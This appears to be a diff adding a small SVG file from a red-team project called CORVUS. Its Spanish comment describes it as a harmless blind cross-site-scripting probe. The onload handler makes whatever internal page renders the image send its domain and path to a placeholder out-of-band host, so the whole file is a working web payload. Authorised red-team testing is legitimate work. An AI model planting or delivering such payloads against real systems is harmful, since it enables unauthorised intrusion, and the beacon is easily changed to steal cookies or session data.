@@ -1,0 +1,6 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- CORVUS Red · XSS ciego inocuo: si un panel interno abre el fichero, avisa al OAST con el dominio y la ruta (sin cookies). -->
+<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"
+     onload="new Image().src='https://OAST_DOMAIN/corvus-bxss?d='+encodeURIComponent(document.domain)+'&amp;p='+encodeURIComponent(location.pathname)">
+  <rect width="10" height="10" fill="#B3121F"/>
+</svg>
